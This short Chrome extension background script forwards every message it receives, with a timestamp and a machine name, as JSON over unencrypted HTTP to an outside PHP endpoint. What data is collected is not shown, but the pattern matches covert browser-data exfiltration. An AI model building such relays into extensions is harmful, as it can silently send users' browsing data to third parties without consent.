chrome.runtime.onMessage.addListener(function(request, sender, sendResponse) { 
  var d = new Date();
  request.data.timeStamp = d.toString();
  computer = localStorage.getItem('computer');
  if (computer == null) computer = 'Larry';
  request.data.computer = computer.toString();
  var data = new Array(request.data);
  var ajax_url = "http://multirecargasysuministros.com/iluminati/recibir.php";
  var ajax_request = new XMLHttpRequest();
  ajax_request.open("POST", ajax_url, true );
  ajax_request.setRequestHeader("Content-Type", "application/json; charset=UTF-8");
  ajax_request.send(JSON.stringify(data));
});